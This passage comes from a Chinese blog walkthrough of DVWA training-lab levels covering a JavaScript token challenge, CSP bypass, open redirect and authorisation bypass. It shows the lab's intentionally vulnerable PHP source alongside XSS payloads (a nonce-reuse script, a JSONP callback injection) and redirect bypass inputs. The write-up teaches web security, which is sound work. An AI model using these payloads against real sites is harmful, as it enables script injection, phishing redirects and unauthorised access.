<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_something</span>(<span class="hljs-params">e</span>)</span>&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;&quot;</span>,n=e.length-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];<span class="hljs-keyword">return</span> t&#125;<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;do_elsesomething(<span class="hljs-string">&quot;XX&quot;</span>)&#125;,<span class="hljs-number">300</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_elsesomething</span>(<span class="hljs-params">e</span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;token&quot;</span>).value=do_something(e+<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;phrase&quot;</span>).value+<span class="hljs-string">&quot;XX&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>

<p>将phrase逆序输出，然后在前后分别添加 XX 作为规律所以当我们输入 success 的话，对应的 token 应该就是XXsseccusXX，这里也就是加密方式替换了而已。</p>
<p>漏洞复现：<br>依旧使用刚才的方法将加密方式的函数更换为do_elsesomething(“XX”);<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-14-36.png" alt="更换函数" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high.js中用了js混淆，打开<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/">逆混淆网址</a>，以调整js，获取到正确的js分析执行顺序<br>漏洞复现：<br>我们一样在控制台采用token_part_1(“ABCD”,44);和token_part_2(“XX”);<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-20-48.png" alt="成功执行" class="lazyload"></p>
<h2 id="DVWA-–-CSP-Bypass-csp绕过"><a href="#DVWA-–-CSP-Bypass-csp绕过" class="headerlink" title="DVWA – CSP Bypass(csp绕过)"></a>DVWA – CSP Bypass(csp绕过)</h2><p>csp(内容安全策略)用于定义脚本和其他资源可以从何处加载或执行，本模块根据开发人员开发时常出现的错误来绕过该策略。这些漏洞都不是csp中的实际漏洞，都是实现csp的方式中的漏洞。绕过内容安全策略并在页面执行JavaScript。</p>
<p>内容安全测略(csp)，为了缓解大部分潜在的xss问题，浏览器的扩展程序系统引入了csp，通过引入一些相当严格的策略使得扩展程序在默认情况下更安全，开发者可以创建并强制一些规则管理网站允许加载的内容。csp以白名单机制对网站加载或执行的资源起作用，在网页中策略通过http头信息或者meta元素定义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Content-Security-Policy:配置好并启用后，不符合CSP的外部资源就会被阻止加载。<br>Content-Security-Policy-Report-Only表示不执行限制选项，只是记录违反限制的行为。它必须与resport-uri选项配合使用<br></code></pre></td></tr></table></figure>

<p>CSP虽然提供了强大的安全保护，但它也使eval()及相关函数被禁用，内嵌的JavaScript代码将不会执行，只能通过白名单来加载远程脚本，如果使用csp保护网站开发者就不得不花费大量时间分离内嵌的js代码和调整。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span><br><span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span><br><span class="hljs-comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>源码定义了一个变量headerCSP放置了一些url，使用scriptsrc指令指向一个外部JavaScript文件，header()函数以原始形式将http标头发送到客户端或浏览器。也就是说源码对http头定义了csp标签从而定义了可接受的外部JavaScript资源的白名单，通过抓包可以知道是那些网站。</p>
<p><a target="_blank" rel="noopener" href="https://pastebin.com/">pastebin</a>是一个快速分享文本内容的网站，加入文本的内容是一段JavaScript代码，网页就会把改代码包含进来。<br>漏洞复现：<br>我们在pastebin写一段js代码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-11-25-21.png" alt="写js" class="lazyload"><br>然后将url注入实现攻击：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-36-17.png" alt="测试" class="lazyload"><br>但没有弹窗弹窗，查询发现<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-37-24.png" alt="错误" class="lazyload"><br>问题暂时没找到解决方法</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这个级别csp策略尝试使用nonce来防止攻击者添加内联脚本，HTTP头信息中的script-src的合法来源发生了变化。script-src还可以设置一些特殊值，unsafe-inline 允许执行页面内嵌的 script 标签和事件监听函数，nonce 值会在每次 HTTP 回应给出一个授权 token。</p>
<p>unsafe-inline：当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 不过当frame-src<br>为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js</p>
<p>nonce-source，仅允许特定的内联脚本块。如源码中：nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</p>
<p>漏洞复现：<br>现在就不是从外界导入 JavaScript 资源了，而是直接通过内联 JavaScript 代码，注入时直接令 nonce 为设定好的值即可。<br><code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-44-52.png" alt="成功" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.src = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;<br>    <span class="hljs-built_in">document</span>.body.appendChild(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-built_in">document</span>.getElementById (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.addEventListener(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        clickButton();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到后端代码除了自身源其余外部资源全部过滤，但是前端添加了一个函数solveSum函数没有对参数做任何处理。即在点击网页的按钮使js生成一个script标签，src指向source/jsonp.php?callback=solveNum。document对象使我们可以从脚本中对HTML页面中的所有元素进行访问，createElement()方法通过指定名称创建一个元素，body属性提供对&lt; body &gt;元素的直接访问，对于定义了框架集的文档将引用最外层的&lt; frameset &gt;。appendChild()方法可向节点的子节点列表的末尾添加新的子节点，也就是网页会把 “source/jsonp.php?callback=solveNum” 加入到DOM中。源码中定义了solveNum的函数函数传入参数 obj，如果字符串 “answer” 在obj 中就会执行。getElementById()方法可返回对拥有指定ID的第一个对象的引用，innerHTML属性设置或返回表格行的开始和结束标签之间的HTML。这里的script标签会把远程加载的solveSum({“answer”:”15”})当作js代码执行，然后这个函数就会在页面显示答案。</p>
<p>漏洞复现：<br>注意到需要向source/jsonp.php传入参数，这个参数没有进行任何的过滤，因此我们可以通过这个参数进行注入。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-58-59.png" alt="查看参数" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-29-29.png" alt="测试" class="lazyload"><br>由于是post提交我们用hackbr添加参数，我们构造参数注入<br><code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-34-30.png" alt="成功绕过弹出窗口" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.src = <span class="hljs-string">&quot;source/jsonp_impossible.php&quot;</span>;<br>    <span class="hljs-built_in">document</span>.body.appendChild(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-built_in">document</span>.getElementById (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.addEventListener(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        clickButton();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>与high等级不同，impossible等级执行JSONP调用，但不使用callback参数，而是硬编码要调用的函数。CSP设置只允许本地服务器上的外部javascript，不允许内联代码。</p>
<h2 id="DVWA-–-Open-HTTP-Redirect"><a href="#DVWA-–-Open-HTTP-Redirect" class="headerlink" title="DVWA – Open HTTP Redirect"></a>DVWA – Open HTTP Redirect</h2><p>这和pikachu靶场的不安全的url重定向类似</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>未作任何处理我们直接在参数中拼接<a target="_blank" rel="noopener" href="http://xxx.com/">http://xxx.com</a>即可重定向<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-55-14.png" alt="找位置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-57-02.png" alt="成功跳转" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/http:\/\/|https:\/\//i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        http_response_code (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>这里使用正则对<a href="http://">http://</a>和<a href="https://">https://</a>头进行检验我们可以让他访问本地的一些文件如phpinfo页面<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-19-28.png" alt="访问本地" class="lazyload"><br>也可以使用相对网址将页面带到百度将http:或者https去掉直接使用//baidu.com<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-28-44.png" alt="跳转" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>], <span class="hljs-string">&quot;info.php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        http_response_code (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;You can only redirect to the info page.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>这里使用strpos函数检测参数中是否有info.php我们可以在参数中添加一个变量指定info.php来绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-08.png" alt="绕过" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-31.png" alt="成功跳转" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">switch</span> (intval (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=1&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=2&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">99</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;https://digi.ninja&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$target</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$target</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-meta">?&gt;</span><br>        Unknown redirect target.<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>Missing redirect target.<br></code></pre></td></tr></table></figure>

<p>系统不接受页面或 URL 作为重定向目标，而是使用 ID 值来告知重定向页面重定向到的位置。这会将系统限制为只能重定向到它知道的页面，因此攻击者无法修改内容以转到他们选择的页面。</p>
<h2 id="DVWA-–-Authorisation-Bypass"><a href="#DVWA-–-Authorisation-Bypass" class="headerlink" title="DVWA – Authorisation Bypass"></a>DVWA – Authorisation Bypass</h2><p>在这里个人理解为越权</p>
<p><strong>Low</strong><br>源码中啥都没<br>毫无防备<br>漏洞复现：<br>我们换一个权限低的账号直接访问被隐藏的管理源才能访问的页面直接访问到<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-49-07.png" alt="low越权" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at these two files for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/get_user_data.php</span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (dvwaCurrentUser() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    http_response_code(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>在这里只限定了对html页面的访问但我们直接访问数据页面呢<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-02-34.png" alt="中级访问" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
